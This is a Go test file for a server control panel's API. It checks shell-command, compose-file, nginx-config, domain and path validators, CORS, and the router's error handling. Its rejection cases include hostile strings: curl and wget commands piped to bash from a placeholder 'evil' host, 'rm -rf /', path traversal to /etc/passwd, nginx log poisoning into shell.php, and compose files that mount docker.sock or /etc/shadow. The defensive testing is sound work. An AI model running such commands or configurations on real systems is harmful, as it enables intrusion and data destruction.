package api

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
)

// ── is_safe_shell_command ──────────────────────────────────────────────────

func TestShellCommandRejectsBareChainOperators(t *testing.T) {
	for _, c := range []string{"id;whoami", "id|whoami", "id ;whoami", "id; whoami", "legit-command;curl http://x/y|bash", "a|||b",
		"id&whoami", "id & whoami", "echo hi & id > /tmp/pwned", "a&&&b"} {
		if isSafeShellCommand(c) == "" {
			t.Fatal(c)
		}
	}
	for _, c := range []string{"php artisan migrate && php artisan cache:clear", "backup.sh || notify-fail.sh", "npm install",
		"backup.sh && verify.sh", "a && b && c"} {
		if m := isSafeShellCommand(c); m != "" {
			t.Fatal(c, m)
		}
	}
}

func TestShellCommandRejectsQuoteSplitEvasion(t *testing.T) {
	for _, c := range []string{"rm -rf /", "r'm' -rf /", `r"m" -rf /`, "cu''rl http://evil|bash", `w\get -qO- http://evil`} {
		if isSafeShellCommand(c) == "" {
			t.Fatal(c)
		}
	}
	for _, c := range []string{"npm run build", "echo 'deployed'"} {
		if m := isSafeShellCommand(c); m != "" {
			t.Fatal(c, m)
		}
	}
}

// ── compose ────────────────────────────────────────────────────────────────

func TestComposeImagesReadsEveryService(t *testing.T) {
	got := composeImages("services:\n  web:\n    image: nginx:1.27\n  db:\n    image: postgres:16-alpine\n")
	slices.Sort(got)
	if !slices.Equal(got, []string{"nginx:1.27", "postgres:16-alpine"}) {
		t.Fatal(got)
	}
}

func TestComposeImagesShapesThatAreNotImages(t *testing.T) {
	if len(composeImages("services:\n  app:\n    build: .\n")) != 0 || len(composeImages("{{{")) != 0 || len(composeImages("version: '3'\n")) != 0 {
		t.Fatal()
	}
	// A whole-node alias DOES resolve — the reason this parses, not greps.
	if n := len(composeImages("services:\n  a: &base\n    image: redis:7\n  b: *base\n")); n != 2 {
		t.Fatal(n)
	}
	// A `<<:` merge key does not, safely: the agent reads the document with
	// the same semantics, so that service has no image there either.
	if n := len(composeImages("services:\n  a: &base\n    image: redis:7\n  b:\n    <<: *base\n")); n != 1 {
		t.Fatal(n)
	}
}

func TestServicesWithoutAnImageAreNamed(t *testing.T) {
	if got := composeServicesWithoutImage("services:\n  web:\n    build: .\n  db:\n    image: postgres:16\n"); !slices.Equal(got, []string{"web"}) {
		t.Fatal(got)
	}
	if len(composeServicesWithoutImage("services:\n  web:\n    image: nginx\n  db:\n    image: postgres:16\n")) != 0 {
		t.Fatal()
	}
	// ⚠ The case that decides the predicate: a blanked/null image line.
	for _, y := range []string{
		"services:\n  web:\n    image:\n    build: .\n  db:\n    image: postgres:16\n",
		"services:\n  web:\n    image: ~\n  db:\n    image: postgres:16\n",
		"services:\n  web:\n    image: null\n  db:\n    image: postgres:16\n",
	} {
		if got := composeServicesWithoutImage(y); !slices.Equal(got, []string{"web"}) {
			t.Fatal(y, got)
		}
	}
	// An empty string is not the dropped-service defect.
	for _, y := range []string{"services:\n  web:\n    image: \"\"\n  db:\n    image: postgres:16\n", "services:\n  web:\n    image: \"   \"\n  db:\n    image: postgres:16\n"} {
		if len(composeServicesWithoutImage(y)) != 0 {
			t.Fatal(y)
		}
	}
}

func TestValidateComposeYAML(t *testing.T) {
	bad := []string{
		"services:\n  a:\n    image: x\n    privileged: true\n",
		"services:\n  a:\n    network_mode: host\n",
		"services:\n  a:\n    pid: host\n",
		"services:\n  a:\n    cap_add: [sys_admin]\n",
		"services:\n  a:\n    volumes: ['/var/run/docker.sock:/var/run/docker.sock']\n",
		"services:\n  a:\n    volumes: [{type: bind, source: /etc/shadow, target: /x}]\n",
		"services:\n  a:\n    volumes: ['/:/host']\n",
		"services:\n  a:\n    security_opt: ['seccomp:unconfined']\n",
		"services:\n  a:\n    devices:\n",
		"services:\n  a: &x\n    privileged: true\n  b: *x\n",
		"services:\n  a:\n    privileged: false\n    privileged: true\n", // duplicate key: invalid YAML, as serde_yaml
		"a: 1\n---\nb: 2\n",
		"{{{",
	}
	for _, y := range bad {
		if validateComposeYAML(y) == "" {
			t.Fatal(y)
		}
	}
	for _, y := range []string{"services:\n  a:\n    image: nginx\n    volumes: ['data:/data']\n    privileged: false\n", "", "services:\n  a:\n    privileged: 'true'\n"} {
		if m := validateComposeYAML(y); m != "" {
			t.Fatal(y, m)
		}
	}
}

// ── reserved domains ───────────────────────────────────────────────────────

func TestReservedDomainsRejected(t *testing.T) {
	panel := sp("panel.example.com")
	for _, d := range []string{"panel.example.com", "PANEL.EXAMPLE.COM", "  panel.example.com  "} {
		if !reservedMatch(d, panel, nil) {
			t.Fatal(d)
		}
	}
	for _, d := range []string{"example.com", "panel.example.com.evil.com", "notpanel.example.com"} {
		if reservedMatch(d, panel, nil) {
			t.Fatal(d)
		}
	}
	apex := sp("example.com")
	if !reservedMatch("example.com", apex, nil) || reservedMatch("blog.example.com", apex, nil) || reservedMatch("anything.example.com", nil, nil) {
		t.Fatal("exact host only")
	}
	zones := []string{"internal.corp"}
	if !reservedMatch("internal.corp", nil, zones) || !reservedMatch("vpn.internal.corp", nil, zones) ||
		reservedMatch("internal.corp.evil.com", nil, zones) || reservedMatch("notinternal.corp", nil, zones) {
		t.Fatal("zones")
	}
}

func TestHostThePanelIsDrivenOnIsReserved(t *testing.T) {
	os.Unsetenv("BASE_URL")
	os.Unsetenv("RESERVED_DOMAINS")
	r := func(host string) *http.Request {
		q := httptest.NewRequest("GET", "/", nil)
		q.Host = host
		return q
	}
	h := r("panel.example.com")
	if !isReservedDomainFor("panel.example.com", h) || !isReservedDomainFor("PANEL.EXAMPLE.COM", h) {
		t.Fatal()
	}
	if !isReservedDomainFor("192.168.1.50", r("192.168.1.50:8443")) {
		t.Fatal("host with port")
	}
	for _, d := range []string{"blog.panel.example.com", "example.com", "notpanel.example.com"} {
		if isReservedDomainFor(d, h) {
			t.Fatal(d)
		}
	}
	if isReservedDomainFor("example.com", r("")) {
		t.Fatal("no Host reserves nothing")
	}
}

func TestPanelHostParsedFromEveryBaseURLShape(t *testing.T) {
	for in, want := range map[string]string{
		"https://panel.example.com": "panel.example.com", "http://192.168.1.1:8443": "192.168.1.1",
		"https://panel.example.com:8443/": "panel.example.com", "HTTPS://Panel.Example.COM": "panel.example.com",
		"https://[2001:db8::1]:8443": "2001:db8::1",
	} {
		if got := panelHostFromBaseURL(in); got == nil || *got != want {
			t.Fatal(in, got)
		}
	}
	if panelHostFromBaseURL("") != nil || panelHostFromBaseURL("   ") != nil {
		t.Fatal("a domainless install yields no host")
	}
}

// ── validators ─────────────────────────────────────────────────────────────

func TestHeaderValueRejectsNginxBreakout(t *testing.T) {
	if !isSafeHeaderValue("default-src 'self'; script-src 'self' https:") || !isSafeHeaderValue("camera=(), microphone=(), geolocation=()") {
		t.Fatal()
	}
	for _, v := range []string{`x" always; location /pwn/ { alias /var/www/; }`, `a\`, "a\nb", "a{b}"} {
		if isSafeHeaderValue(v) {
			t.Fatal(v)
		}
	}
}

func TestNginxConfig(t *testing.T) {
	if isSafeNginxConfig("sendfile on; access_log /var/www/victim/public/shell.php;") == "" || isSafeNginxConfig("gzip on; error_log /var/www/x/y.php;") == "" {
		t.Fatal("chained log poisoning")
	}
	if m := isSafeNginxConfig("proxy_read_timeout 120s;"); m != "" {
		t.Fatal(m)
	}
	for _, s := range []string{"client_max_body_size 20m;", "gzip on;", "gzip_min_length 512;", "  Client_Max_Body_Size 50m;", "proxy_read_timeout 60s; gzip off;"} {
		if m := isSafeNginxConfig(s); !strings.Contains(m, "already") {
			t.Fatal(s, m)
		}
	}
	for _, s := range []string{"add_header X-Extra 1;", "gzip_types application/wasm;", "expires 1d;"} {
		if m := isSafeNginxConfig(s); m != "" {
			t.Fatal(s, m)
		}
	}
}

func TestDomainNameContainerPathValidation(t *testing.T) {
	for _, d := range []string{"example.com", "sub.example.com", "deep.sub.example.com", "my-site.example.com", "a.b", strings.Repeat("a", 63) + ".com"} {
		if !isValidDomain(d) {
			t.Fatal(d)
		}
	}
	for _, d := range []string{"", "localhost", ".example.com", "example.com.", "-example.com", "example-.com", "exam ple.com", "exam_ple.com", strings.Repeat("a", 254), strings.Repeat("a", 64) + ".com"} {
		if isValidDomain(d) {
			t.Fatal(d)
		}
	}
	for _, n := range []string{"mydb", "my-app", "my_app_123", "a", "A1"} {
		if !isValidName(n) {
			t.Fatal(n)
		}
	}
	for _, n := range []string{"", "-starts-with-dash", "_starts_with_underscore", "has space", "has.dot", "has/slash", strings.Repeat("a", 65)} {
		if isValidName(n) {
			t.Fatal(n)
		}
	}
	for _, c := range []string{"abc123", "deadbeef", strings.Repeat("a", 64)} {
		if !isValidContainerID(c) {
			t.Fatal(c)
		}
	}
	for _, c := range []string{"", "not-hex!", "GHIJKL", strings.Repeat("a", 65)} {
		if isValidContainerID(c) {
			t.Fatal(c)
		}
	}
	for _, p := range []string{"index.html", "css/style.css", "wp-content/uploads/image.png", ".htaccess", "."} {
		if !isSafeRelativePath(p) {
			t.Fatal(p)
		}
	}
	for _, p := range []string{"", "../etc/passwd", "foo/../../etc/shadow", "/etc/passwd", "file\x00.txt"} {
		if isSafeRelativePath(p) {
			t.Fatal(p)
		}
	}
}

func TestClientIP(t *testing.T) {
	r := httptest.NewRequest("GET", "/", nil)
	if clientIP(r) != nil {
		t.Fatal()
	}
	r.Header.Set("X-Forwarded-For", " 1.2.3.4 , 5.6.7.8")
	if *clientIP(r) != "1.2.3.4" {
		t.Fatal()
	}
	r.Header.Set("X-Real-IP", "9.9.9.9")
	if *clientIP(r) != "9.9.9.9" {
		t.Fatal("x-real-ip wins")
	}
}

// ── extractors ─────────────────────────────────────────────────────────────

func TestDecodeJSONSemantics(t *testing.T) {
	type inner struct {
		N int `json:"n"`
	}
	type req struct {
		Name  string   `json:"name"`
		Opt   *string  `json:"opt"`
		Def   int      `json:"def" serde:"default"`
		Any   any      `json:"any"`
		Items []inner  `json:"items"`
		Tags  []string `json:"tags" serde:"default"`
	}
	do := func(ct, b string) error {
		r := httptest.NewRequest("POST", "/", strings.NewReader(b))
		if ct != "" {
			r.Header.Set("Content-Type", ct)
		}
		var v req
		return decodeJSON(r, &v)
	}
	status := func(err error) int {
		if err == nil {
			return 0
		}
		return err.(*plainError).Status
	}
	for _, c := range []struct {
		ct, body string
		want     int
	}{
		{"application/json", `{"name":"x","any":null,"items":[{"n":1}]}`, 0},
		{"application/json; charset=utf-8", `{"name":"x","any":1,"items":[]}`, 0},
		{"application/vnd.api+json", `{"name":"x","any":1,"items":[]}`, 0},
		{"", `{"name":"x"}`, 415},
		{"text/plain", `{"name":"x"}`, 415},
		{"application/json", `{"name":`, 400},
		{"application/json", ``, 400},
		{"application/json", `{"name":1,"any":1,"items":[]}`, 422},
		{"application/json", `{"any":1,"items":[]}`, 422},              // missing field `name`
		{"application/json", `{"name":null,"any":1,"items":[]}`, 422},  // null into a non-Option
		{"application/json", `{"name":"x","items":[]}`, 422},           // Value fields are required too
		{"application/json", `{"name":"x","any":1,"items":[{}]}`, 422}, // nested
		{"application/json", `{"name":"x","any":1,"items":null}`, 422}, // Vec from null
	} {
		if got := status(do(c.ct, c.body)); got != c.want {
			t.Fatalf("%s %s: got %d want %d", c.ct, c.body, got, c.want)
		}
	}
	if status(do("application/json", `{"name":"`+strings.Repeat("x", maxJSONBody)+`"}`)) != 413 {
		t.Fatal("over 2MB")
	}
}

func TestDecodeQuery(t *testing.T) {
	type q struct {
		Limit  *int64     `json:"limit"`
		Offset *int64     `json:"offset"`
		Kind   string     `json:"kind"`
		Site   *uuid.UUID `json:"site"`
		All    bool       `json:"all" serde:"default"`
	}
	var v q
	r := httptest.NewRequest("GET", "/?limit=5&kind=x&site=00000000-0000-0000-0000-000000000001&all=true", nil)
	if err := decodeQuery(r, &v); err != nil || *v.Limit != 5 || v.Offset != nil || v.Kind != "x" || v.Site == nil || !v.All {
		t.Fatal(err, v)
	}
	for _, u := range []string{"/?kind=x&limit=abc", "/?limit=1", "/?kind=x&all=yes"} {
		var v q
		if err := decodeQuery(httptest.NewRequest("GET", u, nil), &v); err == nil || err.(*plainError).Status != 400 {
			t.Fatal(u, err)
		}
	}
}

// ── router + layers ────────────────────────────────────────────────────────

func newTestHandler(origins []string, routes func(*Router)) http.Handler {
	st := testState()
	st.Config.CORSOrigins = origins
	rt := &Router{St: st, mux: http.NewServeMux()}
	routes(rt)
	return traceTimeout(300*time.Second, cors(origins, rt))
}

func TestRouterErrorsAndFallbacks(t *testing.T) {
	h := newTestHandler(nil, func(rt *Router) {
		rt.Handle("GET /api/x/{id}", func(w http.ResponseWriter, r *http.Request) error {
			id, err := pathUUID(r, "id")
			if err != nil {
				return err
			}
			writeJSON(w, 200, map[string]any{"id": id, "html": "<b>&"})
			return nil
		})
		rt.Handle("GET /api/err", func(w http.ResponseWriter, r *http.Request) error { return apiErr(418, "teapot") })
		rt.Handle("GET /api/raw", func(w http.ResponseWriter, r *http.Request) error { return io.EOF })
		rt.Handle("GET /api/agent", func(w http.ResponseWriter, r *http.Request) error {
			return &AgentError{Kind: AgentErrStatus, Code: 409, Msg: `{"error":"busy"}`}
		})
	})
	get := func(method, path string) *httptest.ResponseRecorder {
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, httptest.NewRequest(method, path, nil))
		return rec
	}
	id := uuid.New()
	if rec := get("GET", "/api/x/"+id.String()); rec.Code != 200 || rec.Body.String() != `{"html":"<b>&","id":"`+id.String()+`"}` {
		t.Fatal(rec.Code, rec.Body.String())
	}
	if rec := get("GET", "/api/x/nope"); rec.Code != 400 || !strings.HasPrefix(rec.Body.String(), "Invalid URL") {
		t.Fatal(rec.Code, rec.Body.String())
	}
	if rec := get("GET", "/api/err"); rec.Code != 418 || rec.Body.String() != `{"error":"teapot"}` || rec.Header().Get("Content-Type") != "application/json" {
		t.Fatal(rec.Code, rec.Body.String())
	}
	if rec := get("GET", "/api/raw"); rec.Code != 500 || !strings.Contains(rec.Body.String(), "Internal error (ref: ") {
		t.Fatal(rec.Code, rec.Body.String())
	}
	if rec := get("GET", "/api/agent"); rec.Code != 409 || rec.Body.String() != `{"error":"busy"}` {
		t.Fatal(rec.Code, rec.Body.String())
	}
	if rec := get("GET", "/api/nope"); rec.Code != 404 || rec.Body.Len() != 0 {
		t.Fatal("axum's 404 has an empty body", rec.Code, rec.Body.String())
	}
	if rec := get("POST", "/api/err"); rec.Code != 405 || rec.Body.Len() != 0 || rec.Header().Get("Allow") == "" {
		t.Fatal(rec.Code, rec.Body.String(), rec.Header())
	}
}

func TestCORS(t *testing.T) {
	h := newTestHandler([]string{"https://ok.example"}, func(rt *Router) {
		rt.Handle("GET /api/x", func(w http.ResponseWriter, r *http.Request) error { writeJSON(w, 200, 1); return nil })
	})
	pre := httptest.NewRequest("OPTIONS", "/api/x", nil)
	pre.Header.Set("Origin", "https://ok.example")
	pre.Header.Set("Access-Control-Request-Method", "POST")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, pre)
	hd := rec.Header()
	if rec.Code != 200 || hd.Get("Access-Control-Allow-Origin") != "https://ok.example" || hd.Get("Access-Control-Allow-Credentials") != "true" ||
		hd.Get("Access-Control-Allow-Methods") != "GET,POST,PUT,DELETE" || !strings.Contains(hd.Get("Access-Control-Allow-Headers"), "x-server-id") {
		t.Fatal(rec.Code, hd)
	}
	r := httptest.NewRequest("GET", "/api/x", nil)
	r.Header.Set("Origin", "https://evil.example")
	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, r)
	if rec.Code != 200 || rec.Header().Get("Access-Control-Allow-Origin") != "" || rec.Header().Get("Vary") == "" {
		t.Fatal(rec.Header())
	}
	// No origins configured: nothing allowed, no credentials.
	h = newTestHandler(nil, func(rt *Router) {})
	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, pre)
	if rec.Header().Get("Access-Control-Allow-Origin") != "" || rec.Header().Get("Access-Control-Allow-Credentials") != "" {
		t.Fatal(rec.Header())
	}
}

func TestTimeoutIs504AndCancelsHandler(t *testing.T) {
	cancelled := make(chan struct{})
	rt := &Router{St: testState(), mux: http.NewServeMux()}
	rt.Handle("GET /slow", func(w http.ResponseWriter, r *http.Request) error {
		<-r.Context().Done()
		close(cancelled)
		writeJSON(w, 200, "late") // discarded
		return nil
	})
	rt.Handle("GET /stream", func(w http.ResponseWriter, r *http.Request) error {
		w.WriteHeader(200)
		w.(http.Flusher).Flush()
		time.Sleep(150 * time.Millisecond) // past the limit: headers already out
		_, _ = w.Write([]byte("data"))
		return nil
	})
	h := traceTimeout(50*time.Millisecond, rt)
	srv := httptest.NewServer(h)
	defer srv.Close()
	resp, err := http.Get(srv.URL + "/slow")
	if err != nil {
		t.Fatal(err)
	}
	b, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 504 || len(b) != 0 {
		t.Fatal(resp.StatusCode, string(b))
	}
	select {
	case <-cancelled:
	case <-time.After(2 * time.Second):
		t.Fatal("handler context not cancelled")
	}
	resp, err = http.Get(srv.URL + "/stream")
	if err != nil {
		t.Fatal(err)
	}
	b, _ = io.ReadAll(resp.Body)
	if resp.StatusCode != 200 || string(b) != "data" {
		t.Fatal("a response already started must stream past the limit", resp.StatusCode, string(b))
	}
}

func TestBroadcast(t *testing.T) {
	b := NewBroadcast[int](1)
	ch, unsub := b.Subscribe()
	if b.Send(1) != 1 || b.Send(2) != 0 { // second is dropped for the lagging reader
		t.Fatal()
	}
	if <-ch != 1 {
		t.Fatal()
	}
	unsub()
	if _, ok := <-ch; ok {
		t.Fatal("unsubscribe closes")
	}
	ch2, _ := b.Subscribe()
	b.Close()
	if _, ok := <-ch2; ok {
		t.Fatal("close ends every stream")
	}
}

func TestSpawnSupervisedRestartsAndStops(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	runs := make(chan int, 10)
	n := 0
	spawnSupervised(ctx, "t", func(ctx context.Context) {
		n++
		runs <- n
		if n == 1 {
			panic("boom")
		}
		<-ctx.Done()
	})
	for want := 1; want <= 2; want++ {
		select {
		case got := <-runs:
			if got != want {
				t.Fatal(got)
			}
		case <-time.After(3 * time.Second):
			t.Fatal("not restarted after panic")
		}
	}
	cancel()
}

func TestWriteJSONMatchesSerde(t *testing.T) {
	rec := httptest.NewRecorder()
	writeJSON(rec, 201, map[string]any{"a": "<&>", "b": json.RawMessage(`[1]`)})
	if rec.Code != 201 || rec.Body.String() != `{"a":"<&>","b":[1]}` {
		t.Fatal(rec.Body.String())
	}
}
